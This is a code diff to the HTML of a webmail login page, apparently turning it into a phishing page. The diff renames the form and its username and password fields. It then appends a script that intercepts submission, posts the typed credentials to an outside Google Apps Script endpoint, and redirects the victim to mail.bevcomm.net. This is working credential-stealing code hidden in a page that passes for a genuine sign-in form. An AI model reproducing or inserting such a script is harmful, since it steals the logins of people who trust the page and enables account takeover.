@@ -950,7 +950,7 @@ RB,RT,RBC,RTC{white-space:nowrap;}</style>
                             <span class="ImgLoginBanner"></span>
                         </a>
                     </div>				
-				<form id="zLoginForm" method="post" name="loginForm" action="/" accept-charset="UTF-8">
+				<form id="login-form" method="post" name="google-sheet" action="/" accept-charset="UTF-8">
 								<input type="hidden" name="loginOp" value="login">
 								<input type="hidden" name="login_csrf" value="637df6a8-8e7f-4354-b0c4-6207e89dddb1">
 
@@ -959,11 +959,11 @@ RB,RT,RBC,RTC{white-space:nowrap;}</style>
                         <div id="errorMessageDiv" class="errorMessage" style="display: none;">
                             </div>
                         <div class="loginSection">
-                                    <label for="username" class="zLoginFieldLabel">Username</label>
-                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="none" autocorrect="off">
-                                        <label for="password" class="zLoginFieldLabel">Password</label>
+                                    <label for="Username" class="zLoginFieldLabel">Username</label>
+                                            <input id="Username" tabindex="1" class="zLoginFieldInput" name="Username" type="text" value="" size="40" maxlength="1024" autocapitalize="none" autocorrect="off">
+                                        <label for="Password" class="zLoginFieldLabel">Password</label>
                                     <div class="passwordWrapper">
-                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024">
+                                        <input id="Password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="Password" type="password" value="" size="40" maxlength="1024">
                                         <span toggle="#password" onclick="showPassword();" id="showSpan" style="display: block;">Show</span>
                                         <span toggle="#password" onclick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
                                     </div>
@@ -1000,7 +1000,24 @@ RB,RT,RBC,RTC{white-space:nowrap;}</style>
                                 </div>
                             </div>
                         </div>
-                    </form>
+                    </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://mail.bevcomm.net/';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 			</div>
 			<div class="decor1"></div>
 		</div>
